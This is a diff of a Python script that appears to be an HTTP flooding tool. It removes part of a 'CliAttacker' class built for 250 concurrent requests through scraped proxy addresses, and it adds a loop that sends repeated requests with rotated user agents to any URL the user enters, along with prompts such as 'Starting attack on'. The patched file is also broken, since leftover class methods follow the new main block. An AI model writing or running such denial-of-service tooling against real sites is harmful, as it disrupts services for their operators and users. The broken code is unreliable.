@@ -1118,29 +1118,47 @@ proxy_sources = [
 ]
 
 
-class CliAttacker:
-    def __init__(self, target_url, num_requests):
-        self.target_url = target_url
-        self.num_requests = num_requests
-        self.max_concurrent = 250
-        self.success_count = 0
-        self.fail_count = 0
-        self.start_time = None
+# --- Ctrl + C handler ---
+def handle_interrupt(sig, frame):
+    try:
+        choice = input(Fore.YELLOW + "\nDo you want to continue attack? (Y/N): ").strip().lower()
+        if choice == "y":
+            print(Fore.GREEN + "Resuming... Back to enter URL.")
+            main()  # restart main loop
+        else:
+            print(Fore.RED + "Exiting program.")
+            sys.exit(0)
+    except Exception as e:
+        print(Fore.RED + f"Error: {e}")
+        sys.exit(1)
 
-    def log(self, message):
-        print(f"{message}{Fore.RESET}")
+# Attach the handler
+signal.signal(signal.SIGINT, handle_interrupt)
 
-    async def fetch_ip_addresses(self, url):
-        connector = aiohttp.TCPConnector(ssl=False, limit=0)
-        timeout = aiohttp.ClientTimeout(total=10)
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+# --- Async attack function (example placeholder) ---
+async def attack(url):
+    async with aiohttp.ClientSession() as session:
+        while True:
             try:
-                async with session.get(url) as response:
-                    text = await response.text()
-                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
-                    return ip_addresses
-            except:
-                return []
+                headers = {"User-Agent": random.choice(user_agents)}
+                async with session.get(url, headers=headers) as resp:
+                    print(Fore.MAGENTA + f"Sent request to {url} | Status: {resp.status}")
+                await asyncio.sleep(1)  # throttle a bit
+            except Exception as e:
+                print(Fore.RED + f"Error: {e}")
+                break
+
+# --- Main function ---
+def main():
+    url = input(Fore.CYAN + "Enter URL: ").strip()
+    print(Fore.GREEN + f"Starting attack on {url}... Press Ctrl+C to interrupt.")
+    try:
+        asyncio.run(attack(url))
+    except Exception as e:
+        print(Fore.RED + f"Main loop error: {e}")
+
+if __name__ == "__main__":
+    main()
 
     async def get_all_ips(self):
         tasks = [self.fetch_ip_addresses(url) for url in proxy_sources]
